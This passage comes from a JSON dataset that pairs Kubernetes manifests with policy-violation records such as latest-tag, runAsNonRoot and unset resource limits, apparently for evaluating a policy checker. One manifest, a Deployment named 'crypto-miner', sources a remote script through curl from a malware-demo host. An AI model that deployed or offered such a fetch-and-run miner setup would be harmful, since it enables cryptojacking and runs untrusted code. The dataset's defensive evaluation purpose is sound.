    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20191004-b2c87e85c\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --build-cluster=/etc/build-cluster/cluster\n        volumeMounts:\n        - mountPath: /etc/build-cluster\n          name: build-cluster\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: build-cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pipeline\" does not have a read-only root file system"
  },
  {
    "id": "03436",
    "manifest_path": "data/manifests/the_stack_sample/sample_1493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20191004-b2c87e85c\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --build-cluster=/etc/build-cluster/cluster\n        volumeMounts:\n        - mountPath: /etc/build-cluster\n          name: build-cluster\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: build-cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pipeline\" is not set to runAsNonRoot"
  },
  {
    "id": "03437",
    "manifest_path": "data/manifests/the_stack_sample/sample_1493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20191004-b2c87e85c\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --build-cluster=/etc/build-cluster/cluster\n        volumeMounts:\n        - mountPath: /etc/build-cluster\n          name: build-cluster\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: build-cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pipeline\" has cpu request 0"
  },
  {
    "id": "03438",
    "manifest_path": "data/manifests/the_stack_sample/sample_1493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20191004-b2c87e85c\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --build-cluster=/etc/build-cluster/cluster\n        volumeMounts:\n        - mountPath: /etc/build-cluster\n          name: build-cluster\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: build-cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pipeline\" has memory limit 0"
  },
  {
    "id": "03439",
    "manifest_path": "data/manifests/the_stack_sample/sample_1494.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: cpu-demo-ctr\n    image: vish/stress\n    resources:\n      requests:\n        cpu: 1\n        memory: 1G\n      limits:\n        cpu: 1\n        memory: 1G\n    args:\n    - -cpus\n    - '1'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cpu-demo-ctr\" is using an invalid container image, \"vish/stress\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03440",
    "manifest_path": "data/manifests/the_stack_sample/sample_1494.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: cpu-demo-ctr\n    image: vish/stress\n    resources:\n      requests:\n        cpu: 1\n        memory: 1G\n      limits:\n        cpu: 1\n        memory: 1G\n    args:\n    - -cpus\n    - '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cpu-demo-ctr\" does not have a read-only root file system"
  },
  {
    "id": "03441",
    "manifest_path": "data/manifests/the_stack_sample/sample_1494.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: cpu-demo-ctr\n    image: vish/stress\n    resources:\n      requests:\n        cpu: 1\n        memory: 1G\n      limits:\n        cpu: 1\n        memory: 1G\n    args:\n    - -cpus\n    - '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cpu-demo-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "03442",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job1\" does not have a read-only root file system"
  },
  {
    "id": "03443",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job1\" is not set to runAsNonRoot"
  },
  {
    "id": "03444",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job1\" has cpu request 0"
  },
  {
    "id": "03445",
    "manifest_path": "data/manifests/the_stack_sample/sample_1495.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: job1\nspec:\n  template:\n    metadata:\n      name: job1\n    spec:\n      containers:\n      - name: job1\n        image: ubuntu:16.04\n        args:\n        - sh\n        - -c\n        - sleep 10; true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job1\" has memory limit 0"
  },
  {
    "id": "03446",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongodb-trdc\" is using an invalid container image, \"triviman/mongodb-trdc:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03447",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongodb-trdc\" does not have a read-only root file system"
  },
  {
    "id": "03448",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongodb-trdc\" is not set to runAsNonRoot"
  },
  {
    "id": "03449",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongodb-trdc\" has cpu request 0"
  },
  {
    "id": "03450",
    "manifest_path": "data/manifests/the_stack_sample/sample_1496.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-trdc\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb-trdc\n  template:\n    metadata:\n      labels:\n        app: mongodb-trdc\n    spec:\n      containers:\n      - name: mongodb-trdc\n        image: triviman/mongodb-trdc:latest\n        ports:\n        - containerPort: 27017\n        envFrom:\n        - configMapRef:\n            name: cm-mongodb-trdc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongodb-trdc\" has memory limit 0"
  },
  {
    "id": "03451",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nsmgr\" is using an invalid container image, \"registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03452",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nsmgr\" does not have a read-only root file system"
  },
  {
    "id": "03453",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nsmgr\" is not set to runAsNonRoot"
  },
  {
    "id": "03454",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nsmgr\" has cpu request 0"
  },
  {
    "id": "03455",
    "manifest_path": "data/manifests/the_stack_sample/sample_1504.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nsmgr\n  labels:\n    app: nsmgr\nspec:\n  selector:\n    matchLabels:\n      app: nsmgr\n  template:\n    metadata:\n      labels:\n        app: nsmgr\n    spec:\n      containers:\n      - image: registry.nordix.org/cloud-native/nsm/cmd-nsmgr:latest\n        imagePullPolicy: IfNotPresent\n        name: nsmgr\n        ports:\n        - containerPort: 5001\n          hostPort: 5001\n        env:\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NSM_REGISTRY_URL\n          value: nsm-registry-svc:5002\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NSM_LISTEN_ON\n          value: unix:///var/lib/networkservicemesh/nsm.io.sock,tcp://:5001\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nsmgr\" has memory limit 0"
  },
  {
    "id": "03456",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03457",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03458",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03459",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03460",
    "manifest_path": "data/manifests/the_stack_sample/sample_1505.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4226\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03461",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "03462",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "03463",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "03464",
    "manifest_path": "data/manifests/the_stack_sample/sample_1509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --job-config-path=/etc/job-config\n        - --blacklist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "03465",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03466",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03467",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03468",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03469",
    "manifest_path": "data/manifests/the_stack_sample/sample_1510.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2461\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03470",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"crypto-miner\" is using an invalid container image, \"ubuntu:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03471",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: crypto-miner\n  name: crypto-miner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crypto-miner\n  template:\n    metadata:\n      labels:\n        app: crypto-miner\n    spec:\n      containers:\n      - image: ubuntu:latest\n        name: crypto-miner\n        resources:\n          limits:\n            cpu: '1'\n        command:\n        - /bin/bash\n        args:\n        - -c\n        - apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crypto-miner\" does not have a read-only root file system"
  },
  {
    "id": "03472",
    "manifest_path": "data/manifests/the_stack_sample/sample_1511.yaml",
